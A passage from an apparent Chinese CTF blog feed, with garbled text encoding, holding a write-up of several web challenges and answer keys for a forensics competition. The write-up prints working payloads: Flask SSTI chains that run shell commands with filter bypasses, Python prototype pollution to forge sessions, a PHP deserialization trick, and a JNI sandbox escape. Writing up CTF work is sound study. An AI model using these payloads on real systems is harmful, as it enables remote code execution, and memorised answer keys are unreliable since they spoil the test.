            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å•èº«æ¯ctf</title>
      <link href="/2024/11/11/%E5%8D%95%E8%BA%AB%E6%9D%AF/"/>
      <url>/2024/11/11/%E5%8D%95%E8%BA%AB%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="ç­¾åˆ°Â·å¥½ç©çš„PHP"><a href="#ç­¾åˆ°Â·å¥½ç©çš„PHP" class="headerlink" title="ç­¾åˆ°Â·å¥½ç©çš„PHP"></a>ç­¾åˆ°Â·å¥½ç©çš„PHP</h1><img src="/2024/11/11/%E5%8D%95%E8%BA%AB%E6%9D%AF/IMG_20241111-120847052.png" class="">  <p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨INFæ¥ç»•è¿‡<br><img src="/2024/11/11/%E5%8D%95%E8%BA%AB%E6%9D%AF/IMG_20241114-141956831.png" class=""><br>å¯ä»¥å‘ç°INFäºâ€INFâ€çš„md5çš„å€¼æ˜¯ä¸€æ ·çš„ï¼Œè€ŒINFå’Œå­—ç¬¦ä¸²çš„â€INFâ€æ˜¯ä¸åŒç±»å‹çš„ä½¿ç”¨ä¸å¼ºç›¸ç­‰<br>è¾“å‡ºäº†INFã€‚<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">#highlight_file(__FILE__);</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$d</span>=<span class="string">&quot;I&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$s</span>=<span class="string">&quot;N&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$b</span>=<span class="string">&quot;F&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$ctf</span>=INF;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;d = (<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;d;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;s = (<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;s;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = (<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;b;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable language_">$this</span>-&gt;d != <span class="variable language_">$this</span>-&gt;s) &amp;&amp; (<span class="variable language_">$this</span>-&gt;d != <span class="variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="variable language_">$this</span>-&gt;s != <span class="variable language_">$this</span>-&gt;b)) &#123;</span><br><span class="line">            <span class="variable">$dsb</span> = <span class="variable language_">$this</span>-&gt;d.<span class="variable language_">$this</span>-&gt;s.<span class="variable language_">$this</span>-&gt;b;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((<span class="title function_ invoke__">strlen</span>(<span class="variable">$dsb</span>) &lt;= <span class="number">3</span>) &amp;&amp; (<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;ctf) &lt;= <span class="number">3</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> ((<span class="variable">$dsb</span> !== <span class="variable language_">$this</span>-&gt;ctf) &amp;&amp; (<span class="variable language_">$this</span>-&gt;ctf !== <span class="variable">$dsb</span>)) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$dsb</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;ctf)) &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag.txt&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="comment">#unserialize($b);</span></span><br></pre></td></tr></table></figure></p><h1 id="ez-inject"><a href="#ez-inject" class="headerlink" title="ez_inject"></a>ez_inject</h1><img src="/2024/11/11/%E5%8D%95%E8%BA%AB%E6%9D%AF/IMG_20241114-145137573.png" class="">  <p>ç™»é™†åä¼šå‘ç°hintæ˜¯åŸå‹é“¾æ±¡æŸ“<br><img src="/2024/11/11/%E5%8D%95%E8%BA%AB%E6%9D%AF/IMG_20241114-145357514.png" class=""><br>åœ¨æ³¨å†Œç•Œé¢å¯ä»¥çœ‹åˆ°å…¶åå°å¤„ç†jsonã€‚æˆ‘ä»¬å°è¯•åŸå‹é“¾æ±¡æŸ“<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;12344&quot;</span><span class="punctuation">,</span><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;123&quot;</span><span class="punctuation">,</span><span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;app&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;_static_folder&quot;</span><span class="punctuation">:</span><span class="string">&quot;/&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><br>è€Œbaoå¸ˆå‚…è¯´å…¶å¹¶æ²¡æœ‰å¯¹æ±¡æŸ“çš„éƒ¨åˆ†è¿›è¡Œè¿‡æ»¤ã€‚<br>é‚£å…¶å®å°±æœ‰éå¸¸å¤šçš„éé¢„æœŸäº†è´´ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“çš„è€æ–‡ç« <a href="https://www.cnblogs.com/Article-kelp/p/17068716.html">PythonåŸå‹é“¾æ±¡æŸ“å˜ä½“(prototype-pollution-in-python)</a></p><h2 id="é¢„æœŸè§£"><a href="#é¢„æœŸè§£" class="headerlink" title="é¢„æœŸè§£"></a>é¢„æœŸè§£</h2><p>é¢„æœŸè§£å°±æ˜¯æ±¡æŸ“SECRET_KEYç„¶åä¼ªé€ sessionï¼Œç„¶åå†ssti<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;12344&quot;</span><span class="punctuation">,</span><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;123&quot;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__init__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__globals__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;app&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;config&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;SECRET_KEY&quot;</span> <span class="punctuation">:</span><span class="string">&quot;LSE&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><br>æ±¡æŸ“åä½¿ç”¨flask-unsignæ¥è¿›è¡Œä¼ªé€ <br><img src="/2024/11/11/%E5%8D%95%E8%BA%AB%E6%9D%AF/IMG_20241114-151154154.png" class="">  </p><img src="/2024/11/11/%E5%8D%95%E8%BA%AB%E6%9D%AF/IMG_20241114-151139127.png" class="">  <p>æˆåŠŸä¼ªé€ <br><img src="/2024/11/11/%E5%8D%95%E8%BA%AB%E6%9D%AF/IMG_20241114-151313425.png" class=""><br>å…¶æç¤ºæˆ‘ä»¬å†echo<br>å…¶è¿‡æ»¤äº†7*7ç­‰å³æˆ‘ä»¬æ— æ³•é€šè¿‡ç®—æ•°æ¥åˆ¤æ–­<br><img src="/2024/11/11/%E5%8D%95%E8%BA%AB%E6%9D%AF/IMG_20241114-151411832.png" class=""><br>å†è¾“å…¥url<em>forè¿™ç§flaskçš„å†…ç½®å‡½æ•°ä¼šå‘ç”ŸæŠ¥é”™<br>ç›´æ¥è¾“å…¥<br><code>url_for.__globals__.__builtins__[&#39;__import__&#39;](&#39;os&#39;).popen(&#39;nl /flag&#39;).read()</code><br>å‘ç°å…¶è¿›è¡Œäº†è¿‡æ»¤ï¼Œç»è¿‡æµ‹è¯•å…¶è¿‡æ»¤äº†<code>__globals__</code>å’Œ<code>__builtins__</code><br>å¦‚ä¸‹å¯ä»¥ç»•è¿‡<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for[<span class="string">&#x27;__gl&#x27;</span>+<span class="string">&#x27;obals__&#x27;</span>][<span class="string">&#x27;__buil&#x27;</span>+<span class="string">&#x27;tins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;nl /flag&#x27;</span>).read()</span><br></pre></td></tr></table></figure><br>ç„¶åå…¶è¿‡æ»¤äº†cat<br>ç»è¿‡å°è¯•å¯ä»¥ç”¨nlæ¥è¿›è¡Œè¯»å–flag<br><img src="/2024/11/11/%E5%8D%95%E8%BA%AB%E6%9D%AF/IMG_20241114-152157922.png" class=""><br>åˆæ˜¯ä¸€ä¸ªéé¢„æœŸ<br>ä¹‹åæˆ‘æœ‰å‘ç°ç›´æ¥ä½¿ç”¨url<em>forå¾—åˆ°openå‡½æ•°å¯ä»¥ç›´æ¥è¯»å–åˆ°å†…å®¹<br>`url<em>for[â€˜<strong>glâ€™+â€™obals</strong>â€˜][â€˜<em>_builâ€™+â€™tins</em></em>â€˜][â€˜__import</em></em>â€˜](â€˜builtinsâ€™).open(â€˜/flagâ€™).read()`<br><img src="/2024/11/11/%E5%8D%95%E8%BA%AB%E6%9D%AF/IMG_20241114-153127887.png" class="">  </p><p>baoå¸ˆå‚…å…¶å®æ˜¯æƒ³è®©æˆ‘ä»¬é€šè¿‡ç›²æ³¨æ¥è¿›è¡Œå¯¹flagçš„è¯»å–</p><img src="/2024/11/11/%E5%8D%95%E8%BA%AB%E6%9D%AF/IMG_20241114-152431768.png" class="">  <p>cycler[â€œ<strong>inâ€+â€it</strong>â€œ][â€œ<strong>gloâ€+â€bals</strong>â€œ][â€œ<strong>buiâ€+â€ltins</strong>â€œ].<strong>import</strong>(â€˜builtinsâ€™).open(â€˜/flagâ€™).read(1)[0]==â€™câ€™</p><h1 id="ez-ssti"><a href="#ez-ssti" class="headerlink" title="ez_ssti"></a>ez_ssti</h1><img src="/2024/11/11/%E5%8D%95%E8%BA%AB%E6%9D%AF/IMG_20241114-142256833.png" class="">  <p>ç»è¿‡å°è¯•å‘ç°å…¶æœ‰é•¿åº¦é™åˆ¶ï¼Œæœ€å¤šè¾“å…¥40å­—ç¬¦ã€‚è¿™å°±æ„å‘³ç€æ— æ³•ä½¿ç”¨fengjinä¸€æŠŠæ¢­ã€‚<br>äºæ˜¯æˆ‘æ‰¾åˆ°äº†è¿™ç¯‡æ–‡ç« <a href="https://blog.csdn.net/weixin_43995419/article/details/126811287">sstiç»•è¿‡é•¿åº¦é™åˆ¶</a><br>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨sstiæ¥å†™å…¥å†…å®¹åˆ°configè¿™ç§å…¨å±€å˜é‡ã€‚è¿™æ ·å°±å¯ä»¥ç»•è¿‡é•¿åº¦é™åˆ¶äº†</p><p>æ–‡ç« æ˜¯ç”¨<code>&#123;% set x=config.update(s='string') %&#125;</code>æ¥è¿›è¡Œä¿®æ”¹çš„ï¼Œè€Œè¿™é¢˜å¹¶æ²¡æœ‰è¿‡æ»¤<code>&#123;&#123;&#125;&#125;</code>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸‹payloadæ¥å†™å…¥<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.update(f=lipsum.__globals__)&#125;&#125;</span><br><span class="line">&#123;&#123;config.update(o=config.f.os)&#125;&#125;</span><br><span class="line">&#123;&#123;config.update(p=config.o.popen)&#125;&#125;</span><br><span class="line">&#123;&#123;config.p(&quot;cat /flag&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><br>åœ¨å†™å…¥åå¯ä»¥ç›´æ¥ä½¿ç”¨<code>&#123;&#123;config&#125;&#125;</code>æ¥çœ‹æ˜¯å¦å†™å…¥æˆåŠŸ<br><img src="/2024/11/11/%E5%8D%95%E8%BA%AB%E6%9D%AF/IMG_20241114-144004844.png" class=""><br>åœ¨èµ›åçœ‹äº†ä¸€ä¸‹wpï¼Œå‘ç°å‡ºé¢˜äººä½¿ç”¨æ¥å†™å…¥updateï¼Œè¿™æ ·æ¥å‡å°é•¿åº¦ã€‚<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set x=config.update(a=config.update)%&#125;</span><br></pre></td></tr></table></figure><br>é‚£ä¹ˆç»“åˆä¸€ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.update(a=config.update)&#125;&#125;</span><br></pre></td></tr></table></figure><br>å¯ä»¥åšåˆ°34å­—ç¬¦è¿›è¡Œrce</p><h1 id="è¿·é›¾é‡é‡"><a href="#è¿·é›¾é‡é‡" class="headerlink" title="è¿·é›¾é‡é‡"></a>è¿·é›¾é‡é‡</h1><h1 id="ç®€å•çš„æ–‡ä»¶ä¸Šä¼ "><a href="#ç®€å•çš„æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="ç®€å•çš„æ–‡ä»¶ä¸Šä¼ "></a>ç®€å•çš„æ–‡ä»¶ä¸Šä¼ </h1><img src="/2024/11/11/%E5%8D%95%E8%BA%AB%E6%9D%AF/IMG_20241116-132538371.png" class="">  <p>è¿™é“é¢˜ç›®æ˜¯ä¸€ä¸ªä¸Šä¼ jaråŒ…çš„ç¨‹åºï¼Œå…¶å¯ä»¥ä¸Šä¼ jaråŒ…ä¹Ÿå¯ä»¥è¿è¡Œå’Œåˆ é™¤jaråŒ…ã€‚åœ¨å°è¯•ä¸Šä¼ æ¶æ„Runtimeçš„jaråŒ…åå‘ç°å…¶æ— æ³•è¿è¡Œï¼Œå¯ä»¥çŒœæµ‹åˆ°å…¶ä¸€ä¸ªæ˜¯ä½¿ç”¨äº†Java Security Managerã€‚<br><a href="http://www.mi1k7ea.com/2020/05/03/%E6%B5%85%E6%9E%90Java%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">æµ…æJavaæ²™ç®±é€ƒé€¸</a><br>å‚è€ƒè¿™ç¯‡æ–‡ç« æˆ‘ä»¬å¯ä»¥å‘ç°å¯ä»¥ä½¿ç”¨Java nativeæ–¹æ³•æ¥ç»•è¿‡æ²™ç®±ã€‚Java nativeæ˜¯javaè°ƒç”¨æ‰§è¡Œå…¶ä»–è¯­è¨€çš„ä¸€ç§æœºåˆ¶ã€‚å…¶å¯ä»¥å°†soæ–‡ä»¶çš„ä»£ç è¿›è¡ŒåŠ è½½ã€‚å½“æˆ‘ä»¬è°ƒç”¨nativeæ–¹æ³•æ—¶ï¼Œå¯ä»¥å°†è°ƒç”¨çš„å‚æ•°ä¼ åˆ°soæ–‡ä»¶çš„ä»£ç ä¸­ä¸”Java Security Managerã€‚ä¸ä¼šæ£€æµ‹ï¼Œè¿™å°±å¯¼è‡´äº†æ²™ç®±é€ƒé€¸</p><p>æˆ‘ä»¬éšä¾¿ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ï¼Œå°±å¯ä»¥çŸ¥é“ä¸Šä¼ çš„æ–‡ä»¶çš„ä¸Šä¼ ä½ç½®æ˜¯åœ¨/var/www/html/uploads/xxxx<br>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åœ¨æœ¬åœ°ç¼–å†™ä¸€ä¸ªå®ç°nativeçš„cè¯­è¨€ç¼–è¯‘çš„soæ–‡ä»¶ã€‚ç„¶åä¸Šä¼ åˆ°è¯¥ç›®å½•ä¸‹ï¼Œç„¶åå†™ä¸€ä¸ªjaråŒ…å°†nativeæ–¹æ³•å’Œè°ƒç”¨å…¶æ–¹æ³•çš„classæ–‡ä»¶æ‰“åŒ…æˆä¸€ä¸ªjaråŒ…<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctfshow;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CTFshowCodeManager</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.load(<span class="string">&quot;/var/www/html/uploads/CTFshowCodeManager.jar&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> String <span class="title function_">eval</span><span class="params">(String cmd)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctfshow;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        CTFshowCodeManager.eval(<span class="string">&quot;ls /&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰“åŒ…æˆjaråŒ…åœ¨å’Œæ¶æ„soæ–‡ä»¶ä¸€èµ·ä¸Šä¼ ä¹‹åè¿è¡ŒjaråŒ…å³å¯æŸ¥çœ‹æ ¹ç›®å½•æ–‡ä»¶</p><img src="/2024/11/11/%E5%8D%95%E8%BA%AB%E6%9D%AF/IMG_20241116-140142690.png" class="">  <p>ä¹‹åè¯»å–flagå³å¯<br><img src="/2024/11/11/%E5%8D%95%E8%BA%AB%E6%9D%AF/IMG_20241116-140256847.png" class="">  </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/11/09/%E7%BE%8E%E4%BA%9A24/"/>
      <url>/2024/11/09/%E7%BE%8E%E4%BA%9A24/</url>
      
        <content type="html"><![CDATA[<p>0887EA0B-12ED-43E8-970B-6721951B6975</p><p>18<br>19 C<br>31 0x7f0c0000<br>32 B,C<br>42 B<br>43 A   64F4E21C1E4CC3A60137DA79E75BF973<br>44 A<br>45 C<br>46<br>49 C<br>50 A<br>51 B<br>52 B<br>53 D<br>54 A (ä¸ç¡®å®š)<br>55 D<br>56<br>57 A,Dæ’ä¸æ‰<br>58 SUID<br>59 D<br>60 tor-browser-launcher<br>61 4<br>62<br>63 YES<br>64<br>65<br>66<br>69 <a href="https://teamviewer_internal/">https://teamviewer_internal/</a><br>70 90:61:AE:C0:90:C2<br>71 C<br>72 192.168.182.2/24<br>73 687062512</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>23ç¾äºšä¸ªäºº</title>
      <link href="/2024/11/08/23%E7%BE%8E%E4%BA%9A%E4%B8%AA%E4%BA%BA/"/>
      <url>/2024/11/08/23%E7%BE%8E%E4%BA%9A%E4%B8%AA%E4%BA%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="1-â€œå‚è€ƒ-â€˜-Android-bin-â€˜-å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#1-â€œå‚è€ƒ-â€˜-Android-bin-â€˜-å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="1    â€œå‚è€ƒ â€˜ Android.bin â€˜ å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>1    â€œå‚è€ƒ â€˜ Android.bin â€˜ å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜Android.binâ€™ to answer below question</p><p>æå¤§è¾‰æ‰€ç”¨æ‰‹æœºç§»åŠ¨è¿è¥å•†å…¬å¸çš„åç§°<br>What is the name of the telecommunication company that Li Dahuiâ€™s mobile phone is using.</p><p>æç¤º:è¯·æ‰€æœ‰å­—æ¯éƒ½ç”¨å¤§å†™è‹±æ–‡<br>Tips: Please answer in capital letters. </p><p>â€œ    å¡«ç©º<br>LGE</p><h1 id="2-â€œå‚è€ƒ-â€˜-Android-bin-â€˜-å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#2-â€œå‚è€ƒ-â€˜-Android-bin-â€˜-å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="2    â€œå‚è€ƒ â€˜ Android.bin â€˜ å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>2    â€œå‚è€ƒ â€˜ Android.bin â€˜ å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜Android.binâ€™ to answer below question</p><p>æå¤§è¾‰çš„æ‰‹æœºå®‰è£…äº†ä»€ä¹ˆå³æ—¶é€šè®¯è½¯ä»¶ (Instant Messaging App)?<br>What instant messaging app is installed on Li Dahuiâ€™s mobile phone?<br>â€œ    å•é€‰    A: WhatsApp;B: LINE;C: å¾®ä¿¡;D: Signal;E: QQ<br>C</p><h1 id="3-â€œå‚è€ƒ-â€˜-Android-bin-â€˜-å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#3-â€œå‚è€ƒ-â€˜-Android-bin-â€˜-å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="3    â€œå‚è€ƒ â€˜ Android.bin â€˜ å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>3    â€œå‚è€ƒ â€˜ Android.bin â€˜ å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜Android.binâ€™ to answer below question</p><p>æå¤§è¾‰çš„æ‰‹æœºå®‰è£…äº†ä»€ä¹ˆåè¿½è¸ªè½¯ä»¶?<br>What anti-tracking software is installed on Li Dahuiâ€™s mobile phone?</p><p>æç¤º: æ‰€æœ‰ç­”æ¡ˆå­—æ¯éƒ½ç”¨å°å†™å­—æ¯å¹¶ç”¨xxx_xxx_xxxxxxx_xxxxxx_xxxxæ ¼å¼ä½œç­”<br>Tips: Please answer the question as below format in lowercase letters.<br>â€œ    å¡«ç©º    </p><h1 id="4-â€œå‚è€ƒ-â€˜-Android-bin-â€˜-å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#4-â€œå‚è€ƒ-â€˜-Android-bin-â€˜-å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="4    â€œå‚è€ƒ â€˜ Android.bin â€˜ å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>4    â€œå‚è€ƒ â€˜ Android.bin â€˜ å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜Android.binâ€™ to answer below question</p><p>æå¤§è¾‰çš„æ‰‹æœºæ˜¯ä»€ä¹ˆæ—¶é—´æˆåŠŸç™»å…¥WhatsApp?<br>At what time did Li Dahuiâ€™s mobile phone successfully log into WhatsApp?<br><img src="/2024/11/08/23%E7%BE%8E%E4%BA%9A%E4%B8%AA%E4%BA%BA/IMG_20241108-215808762.png" class="">  </p><p>â€œ    å•é€‰    A: 2022-08-18_21:52:30;B: 2022-08-19_21:56:23;C: 2022-08-18_21:56:37;D: 2022-08-19_06:59:07;E: 2022-08-19_07:01:17</p><h1 id="5-â€œå‚è€ƒ-â€˜-Android-bin-â€˜-å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#5-â€œå‚è€ƒ-â€˜-Android-bin-â€˜-å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="5    â€œå‚è€ƒ â€˜ Android.bin â€˜ å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>5    â€œå‚è€ƒ â€˜ Android.bin â€˜ å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜Android.binâ€™ to answer below question</p><p>æå¤§è¾‰ç™»å…¥WHATSAPPæ—¶çš„è®¤è¯çŸ­ç æ˜¯ä»€ä¹ˆ?<br>What was the verification code that Li Dahui used to log into WhatsApp?<br>998433<br>æç¤º: è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—ä½œç­”<br>Tips: Please answer in arabic numbers.â€    å¡«ç©º    </p><h1 id="6-â€œå‚è€ƒ-â€˜-Android-bin-â€˜-å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#6-â€œå‚è€ƒ-â€˜-Android-bin-â€˜-å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="6    â€œå‚è€ƒ â€˜ Android.bin â€˜ å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>6    â€œå‚è€ƒ â€˜ Android.bin â€˜ å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜Android.binâ€™ to answer below question</p><p>æå¤§è¾‰åˆ°ç¾ä¸½å¥½åŒ–å¦†å“å…¬å¸çš„å…¥èŒæ—¶é—´æ˜¯ä½•æ—¶ï¼Ÿ<br>When did Li Dahui join the Beauty Good Cosmetics Company?â€    å•é€‰    A: 2016-04-16;B: 2016-06-28;C: 2017-05-25;D: 2017-07-25;E: 2017-08-18</p><p>2017-05-25</p><h1 id="7-â€œå‚è€ƒ-â€˜-Android-bin-â€˜-å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#7-â€œå‚è€ƒ-â€˜-Android-bin-â€˜-å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="7    â€œå‚è€ƒ â€˜ Android.bin â€˜ å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>7    â€œå‚è€ƒ â€˜ Android.bin â€˜ å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜Android.binâ€™ to answer below question</p><p>æå¤§è¾‰æ›¾äºä»€ä¹ˆæ—¶é—´ä½¿ç”¨äº†å›¾åƒç¼–è¾‘è½¯ä»¶?<br>At what time did Li Dahui use image editing software?â€    å•é€‰    A: 2022-09-10;B: 2022-09-12;C: 2022-10-05;D: 2022-11-10;E: 2022-11-13</p><h1 id="8-â€œå‚è€ƒServeræ–‡ä»¶å¤¹ä¸‹çš„-â€˜-Meiya-VPN-vmdk-â€˜-å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#8-â€œå‚è€ƒServeræ–‡ä»¶å¤¹ä¸‹çš„-â€˜-Meiya-VPN-vmdk-â€˜-å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="8    â€œå‚è€ƒServeræ–‡ä»¶å¤¹ä¸‹çš„ â€˜ Meiya_VPN.vmdk â€˜ å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>8    â€œå‚è€ƒServeræ–‡ä»¶å¤¹ä¸‹çš„ â€˜ 